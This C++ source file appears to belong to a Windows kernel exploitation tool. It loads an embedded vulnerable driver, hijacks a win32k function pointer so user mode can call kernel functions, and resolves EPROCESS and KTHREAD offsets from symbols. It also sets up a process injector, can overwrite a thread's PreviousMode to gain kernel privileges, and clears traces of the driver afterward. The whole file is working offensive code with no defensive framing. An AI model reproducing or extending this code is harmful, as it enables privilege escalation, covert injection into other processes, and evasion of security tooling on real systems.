#include "Context.hpp"

#include "VunerableDriver.hpp"
#include "DebugLogger.hpp"
#include "StringHash.hpp"
#include "Syscall.hpp"
#include "Memory.hpp"
#include "File.hpp"

#include <fstream>

bool Kernel::Context::InitilizeFunctionCaller(uint64_t FunctionHash)
{
    // Calculating the result
    uint64_t PointerAddress = m_ObjectFetcher->FetchPointerAddress(HashString_("win32k.sys"), FunctionHash);

    if (PointerAddress == NULL) 
    {
        DebugErrorLog();
        return false;
    }

    m_Function = std::make_shared<Kernel::FunctionCaller>(Kernel::FunctionCaller(
        m_ObjectFetcher->FetchContextByHash(HashString_("explorer.exe")),
        PointerAddress,
        Kernel::File::GetExport((uint64_t)LoadLibraryA("win32u.dll"), FunctionHash)
    ));
    
    DebugLog("PointerAddress -> 0x%llx\n", PointerAddress);

    return true;
}

Kernel::Context::Context(const char* DriverName)
{
    m_DriverLoader = std::make_unique<Kernel::DriverLoader>(DriverName);
    m_ObjectFetcher = std::make_unique<Kernel::ObjectFetcher>();
    Kernel::SystemCall->Create();
}

uint64_t Kernel::Context::FetchModulePattern(uint64_t ModuleHash, BYTE* Pattern, const char* Mask)
{
    return Kernel::ObjectFetcher::FetchModulePattern(ModuleHash, Pattern, Mask);
}

Kernel::Struct& Kernel::Context::FetchModuleStruct(uint64_t ModuleHash, uint64_t StructHash)
{
    return Kernel::ObjectFetcher::FetchModuleStruct(ModuleHash, StructHash);
}

uint64_t Kernel::Context::FetchModuleData(uint64_t ModuleHash, uint64_t DataHash)
{
    return Kernel::ObjectFetcher::FetchModuleData(ModuleHash, DataHash);
}

Kernel::ObjectFetcher::ModuleInformation Kernel::Context::FetchModule(uint64_t ModuleHash)
{
    return Kernel::ObjectFetcher::FetchModule(ModuleHash);
}

uint64_t Kernel::Context::FetchPointerAddress(uint64_t ModuleHash, uint64_t FunctionHash)
{
    return m_ObjectFetcher->FetchPointerAddress(ModuleHash, FunctionHash);
}

uint64_t Kernel::Context::FetchProcess(uint64_t InitialProcess, uint64_t ProcessHash)
{
    return m_ObjectFetcher->FetchProcess(InitialProcess, ProcessHash);
}

bool Kernel::Context::InsideModule(uint64_t Address, uint64_t ModuleHash)
{
    Kernel::ObjectFetcher::ModuleInformation ModuleInfo = Kernel::ObjectFetcher::FetchModule(ModuleHash);

    if (ModuleInfo.BaseAddress == NULL) {
        return false;
    }

    // Check if Address is within the module's memory range
    return (Address >= ModuleInfo.BaseAddress &&
        Address < (ModuleInfo.BaseAddress + ModuleInfo.Length));
}

uint64_t Kernel::Context::ResolvePointerAddress(uint64_t ModuleHash, uint64_t Address)
{
    Kernel::ObjectFetcher::ModuleInformation ModuleInfo = Kernel::ObjectFetcher::FetchModule(ModuleHash);

    if (ModuleInfo.BaseAddress == NULL) 
    {
        DebugErrorLog();
        return NULL;
    }

    uint64_t Context = m_ObjectFetcher->FetchContextByHash(HashString_("explorer.exe"));

    if (Context == NULL)
    {
        DebugErrorLog();
        return NULL;
    }

    uint64_t PreviousContext = Kernel::Memory::SetContext(Context);

    // Reading the relative offset in memory to the .data pointer
    int RelativeOffset = NULL;
    Kernel::Memory::ReadVirtual(
        Address + 3,
        &RelativeOffset,
        sizeof(int)
    );

    Kernel::Memory::SetContext(PreviousContext);

    if (RelativeOffset == NULL)
    {
        DebugErrorLog();
        return NULL;
    }

    uint64_t ResolvedAddress = Address + RelativeOffset + 7;

    if (InsideModule(ResolvedAddress, ModuleHash) == false)
    {
        DebugErrorLog();
        return NULL;
    }

    return ResolvedAddress;
}

uint64_t Kernel::Context::FetchSystemProcess()
{
    return m_ObjectFetcher->FetchSystemProcess();
}

uint64_t Kernel::Context::FetchProcess(uint64_t Process, bool HashSearch)
{
    if (HashSearch) {
        return m_ObjectFetcher->FetchProcessByHash(Process);
    }
    else {
        return m_ObjectFetcher->FetchProcessByContext(Process);
    }
}

uint64_t Kernel::Context::FetchContext(uint64_t Process, bool HashSearch)
{
    if (HashSearch) {
        return m_ObjectFetcher->FetchContextByHash(Process);
    }
    else {
        return m_ObjectFetcher->FetchContextByObject(Process);
    }
}

uint64_t Kernel::Context::FetchContextById(uint32_t ProcessId)
{
    // Fetching EPROCESS Offset Data from the symbol
    Struct& KProcessStruct = Kernel::PdbFetcher::Fetch(HashString_("ntoskrnl.exe"))->GetStruct(HashString_("_KPROCESS"));

    uint64_t Process = m_ObjectFetcher->FetchProcessByProcessId(ProcessId);

    if (Process == NULL) {
        return NULL;
    }

    uint64_t DirectoryTableBase = NULL;
    if (Kernel::Memory::ReadVirtual(
        Process + KProcessStruct.GetProperty(HashString_("DirectoryTableBase")),
        &DirectoryTableBase,
        sizeof(uint64_t)) == false) {
        return NULL;
    }

    return DirectoryTableBase;
}

uint32_t Kernel::Context::FetchProcessId(uint64_t ProcessHash)
{
    uint64_t Object = m_ObjectFetcher->FetchProcessByHash(ProcessHash);

    if (Object == NULL) {
        return NULL;
    }

    Kernel::Struct& EProcess = Kernel::PdbFetcher::Fetch(HashString_("ntoskrnl.exe"))->GetStruct(HashString_("_EPROCESS"));

    uint64_t UniqueProcessId = NULL;
    if (Kernel::Memory::ReadVirtual(Object + EProcess.GetProperty(HashString_("UniqueProcessId")), &UniqueProcessId, 8) == false) {
        return NULL;
    }

    return UniqueProcessId;
}

void Kernel::Context::SetPreviousMode(uint8_t Mode)
{
    uint64_t Object = m_Function->Call<uint64_t>(HashString_("PsGetCurrentThread"));

    if (Object == NULL) {
        return;
    }

    Kernel::Struct& KThread = Kernel::PdbFetcher::Fetch(HashString_("ntoskrnl.exe"))->GetStruct(HashString_("_KTHREAD"));
    Kernel::Memory::WriteVirtual(Object + KThread.GetProperty(HashString_("PreviousMode")), &Mode, 1);
}

std::shared_ptr<Kernel::FunctionCaller>& Kernel::Context::GetFunction()
{
    return m_Function;
}

std::unique_ptr<Kernel::Injector>& Kernel::Context::GetInjector()
{
    return m_Injector;
}

Kernel::HashArray Kernel::Context::GetCommunicationData()
{
    Kernel::HashArray CommunicationData = Kernel::HashArray(20);

    CommunicationData.AddProperty(HashString_("Function::PsGetCurrentThread"), Kernel::ObjectFetcher::FetchModuleData(HashString_("ntoskrnl.exe"), HashString_("PsGetCurrentThread")));
    CommunicationData.AddProperty(HashString_("Function::Handler"), Kernel::ObjectFetcher::FetchModuleData(HashString_("ntoskrnl.exe"), HashString_("Handler")));
    CommunicationData.AddProperty(HashString_("Function::MmUnmapIoSpace"), Kernel::ObjectFetcher::FetchModuleData(HashString_("ntoskrnl.exe"), HashString_("MmUnmapIoSpace")));
    CommunicationData.AddProperty(HashString_("Function::MmMapIoSpaceEx"), Kernel::ObjectFetcher::FetchModuleData(HashString_("ntoskrnl.exe"), HashString_("MmMapIoSpaceEx")));
    CommunicationData.AddProperty(HashString_("Function::MmCopyMemory"), Kernel::ObjectFetcher::FetchModuleData(HashString_("ntoskrnl.exe"), HashString_("MmCopyMemory")));
    CommunicationData.AddProperty(HashString_("Function::memcpy"), Kernel::ObjectFetcher::FetchModuleData(HashString_("ntoskrnl.exe"), HashString_("memcpy")));

    CommunicationData.AddProperty(HashString_("ExplorerProcess::Object"), FetchProcess(HashString_("explorer.exe"), true));
    CommunicationData.AddProperty(HashString_("ExplorerProcess::Context"), FetchContext(CommunicationData.GetProperty(HashString_("ExplorerProcess::Object")), false));
    CommunicationData.AddProperty(HashString_("SystemProcess::Context"), Kernel::Memory::GetContext());
    CommunicationData.AddProperty(HashString_("SystemProcess::Object"), FetchSystemProcess());

    Kernel::DatabaseData DatabaseData = m_ObjectFetcher->GetDatabaseData();

    CommunicationData.AddProperty(HashString_("Database::Address"), DatabaseData.Address);
    CommunicationData.AddProperty(HashString_("Database::Length"), DatabaseData.Length);
    CommunicationData.AddProperty(HashString_("Database::NumberOfPages"), DatabaseData.NumberOfPages);

    Kernel::Struct& EProcess = Kernel::PdbFetcher::Fetch(HashString_("ntoskrnl.exe"))->GetStruct(HashString_("_EPROCESS"));

    CommunicationData.AddProperty(HashString_("ProcessOffset::ActiveProcessLinks"), EProcess.GetProperty(HashString_("ActiveProcessLinks")));
    CommunicationData.AddProperty(HashString_("ProcessOffset::ImageFileName"), EProcess.GetProperty(HashString_("ImageFileName")));
    CommunicationData.AddProperty(HashString_("ProcessOffset::VirtualSize"), EProcess.GetProperty(HashString_("VirtualSize")));
    CommunicationData.AddProperty(HashString_("ProcessOffset::PebAddress"), EProcess.GetProperty(HashString_("Peb")));

    Kernel::Struct& KThread = Kernel::PdbFetcher::Fetch(HashString_("ntoskrnl.exe"))->GetStruct(HashString_("_KTHREAD"));

    CommunicationData.AddProperty(HashString_("ThreadOffset::MiscFlags"), KThread.GetProperty(HashString_("MiscFlags")));

    return CommunicationData;
}

bool Kernel::Context::Initilize()
{
    if (m_DriverLoader->Load(reinterpret_cast<char*>(Kernel::VunerableDriver), sizeof(Kernel::VunerableDriver)) == false)
    {
        DebugErrorLog();
        return false;
    }

    // Creating a handle to our vunerable driver
	NTSTATUS CreateHandleStatus = Kernel::Memory::CreateHandle();

    switch (CreateHandleStatus)
    {
    case 0xC0000034: // STATUS_OBJECT_NAME_NOT_FOUND
    {
        DebugErrorLog();
        return false;
    } break;
    case 0xC0000022: // STATUS_ACCESS_DENIED
    {
        DebugErrorLog();
        return false;
    } break;
    case 0xC0000719: // STATUS_CONTEXT_MISMATCH
    {
        DebugErrorLog();
        return false;
    } break;
    case 0x00: // STATUS_SUCCESS
    {
        DebugLog("Created Handle!\n");
    }break;
    }

    // Getting PsInitialSystemProcess and MmPfnDatabase
    if (m_ObjectFetcher->Initilize() == false)
    {
        DebugErrorLog();
        return false;
    }

    // Creating an instance of the kernel function invoker
    if (InitilizeFunctionCaller(HashString_("NtGdiEngStretchBlt")) == false)
    {
        DebugErrorLog();
        return false;
    }

    // Creating our injector instance
    m_Injector = std::make_unique<Kernel::Injector>(m_Function);

    // Creating our driver trace clearer instance
    m_DriverTraceClear = std::make_unique<Kernel::DriverTraceClear>(
        m_ObjectFetcher->FetchDriverObject(Kernel::Memory::GetHandle()),
        m_DriverLoader->GetDriverName(),
        m_DriverLoader->GetDriverPath(),
        m_Function
    );

    // Clearing traces of our vunerable driver
    m_DriverTraceClear->Clear();

	return true;
}

bool Kernel::Context::Shutdown()
{
    if (m_DriverLoader->Unload() == false)
    {
        DebugErrorLog();
        return false;
    }

    return true;
}
